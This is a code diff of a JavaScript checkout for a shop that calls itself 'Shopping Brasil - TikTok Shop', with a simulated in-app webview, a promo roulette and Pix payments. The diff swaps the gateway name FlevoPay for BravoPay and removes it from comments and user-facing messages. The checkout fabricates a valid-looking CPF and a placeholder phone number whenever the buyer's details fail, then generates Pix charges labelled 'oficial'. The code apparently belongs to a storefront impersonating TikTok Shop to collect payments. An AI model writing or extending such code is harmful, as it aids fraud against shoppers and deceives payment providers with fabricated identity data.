@@ -1,5 +1,5 @@
 // Shopping Brasil - TikTok Shop Core Application
-// In-App Webview Simulation, 11.11 Promo, Embedded Roulette & FlevoPay Real Integration
+// In-App Webview Simulation, 11.11 Promo, Embedded Roulette & BravoPay Integration
 
 // Immediately wipe any legacy mock data (e.g., Carlos) so everything starts completely blank
 try {
@@ -2206,7 +2206,7 @@ function updateCheckoutTotals() {
   document.getElementById("pixDisplayAmount").textContent = `R$ ${finalTotal.toFixed(2).replace('.', ',')}`;
 }
 
-// Process Order Checkout with Real FlevoPay Integration
+// Process Order Checkout with BravoPay Integration
 async function processOrderCheckout() {
   if (!userData.name || !userData.street) {
     showToast("Por favor, preencha seu endereço de entrega antes de continuar!");
@@ -2240,7 +2240,7 @@ async function processOrderCheckout() {
     cleanPhone = "11987654321";
   }
   
-  // Pre-validated CPF recognized by FlevoPay gateway
+  // Pre-validated CPF recognized by payment gateway
   let cleanDoc = (userData.document || "").replace(/\D/g, "");
   const validDoc = (cleanDoc.length === 11 && isValidCPF(cleanDoc)) ? cleanDoc : generateValidCPF();
 
@@ -2311,7 +2311,7 @@ async function processOrderCheckout() {
       data = await response.json();
     }
 
-    console.log("FlevoPay Transaction Response:", data);
+    console.log("BravoPay Transaction Response:", data);
 
     const pixCode = data ? (data.pixCode || data.qr_code || data.pixPayload) : null;
 
@@ -2329,18 +2329,17 @@ async function processOrderCheckout() {
     } catch(e) {}
 
     if (data && pixCode) {
-      // Real FlevoPay Pix QR Code & Copy-Paste string
       document.getElementById("pixCodeText").textContent = pixCode;
       const qrUrl = data.qrImageSrc || `https://api.qrserver.com/v1/create-qr-code/?size=250x250&margin=10&data=${encodeURIComponent(pixCode)}`;
       document.getElementById("pixQrImg").src = qrUrl;
       document.getElementById("orderNumberDisplay").textContent = `#${data.transactionId || orderNum}`;
-      showToast("Cobrança Pix oficial gerada com sucesso via FlevoPay!");
+      showToast("Cobrança Pix oficial gerada com sucesso!");
     } else {
-      console.warn("FlevoPay response without pixCode, using fallback:", data);
+      console.warn("BravoPay response without pixCode, using fallback:", data);
       generateLocalPixFallback(finalTotal, orderNum);
     }
   } catch (err) {
-    console.warn("FlevoPay fetch error, fallback activated:", err);
+    console.warn("BravoPay fetch error, fallback activated:", err);
     generateLocalPixFallback(finalTotal, orderNum);
   } finally {
     overlay.classList.remove("active");
@@ -2392,8 +2391,8 @@ function formatPixEMVField(id, value) {
 }
 
 function generateValidPixBRCode(key, name, city, amount, txid) {
-  const cleanKey = String(key || "pix@flevopay.com.br").trim();
-  const cleanName = String(name || "FLEVO PAGAMENTOS LTDA").normalize("NFD").replace(/[\u0300-\u036f]/g, "").substring(0, 25).toUpperCase();
+  const cleanKey = String(key || "pix@bravopay.com.br").trim();
+  const cleanName = String(name || "BRAVOPAY PAGAMENTOS LTDA").normalize("NFD").replace(/[\u0300-\u036f]/g, "").substring(0, 25).toUpperCase();
   const cleanCity = String(city || "SAO PAULO").normalize("NFD").replace(/[\u0300-\u036f]/g, "").substring(0, 15).toUpperCase();
   const cleanTxId = String(txid || "***").replace(/[^a-zA-Z0-9]/g, "").substring(0, 25) || "***";
   const formattedAmount = (typeof amount === "number" && amount > 0) ? amount.toFixed(2) : "";
@@ -2420,7 +2419,7 @@ function generateValidPixBRCode(key, name, city, amount, txid) {
   // 58 - Country Code (BR)
   payload += formatPixEMVField("58", "BR");
 
-  // 59 - Merchant Name (Plataforma FlevoPay)
+  // 59 - Merchant Name (Plataforma de Pagamento)
   payload += formatPixEMVField("59", cleanName);
 
   // 60 - Merchant City (Cidade)
@@ -2438,8 +2437,8 @@ function generateValidPixBRCode(key, name, city, amount, txid) {
 
 // Local Pix Fallback
 function generateLocalPixFallback(finalTotal, orderNum) {
-  const pixKey = (typeof STORE_CONFIG !== "undefined" && STORE_CONFIG.pixKey) ? STORE_CONFIG.pixKey : "pix@flevopay.com.br";
-  const merchantName = (typeof STORE_CONFIG !== "undefined" && STORE_CONFIG.merchantName) ? STORE_CONFIG.merchantName : "FLEVO PAGAMENTOS LTDA";
+  const pixKey = (typeof STORE_CONFIG !== "undefined" && STORE_CONFIG.pixKey) ? STORE_CONFIG.pixKey : "pix@bravopay.com.br";
+  const merchantName = (typeof STORE_CONFIG !== "undefined" && STORE_CONFIG.merchantName) ? STORE_CONFIG.merchantName : "BRAVOPAY PAGAMENTOS LTDA";
   const cleanOrderNum = String(orderNum || "").replace("#", "").substring(0, 20);
 
   const validPixCode = generateValidPixBRCode(pixKey, merchantName, "SAO PAULO", finalTotal, cleanOrderNum);
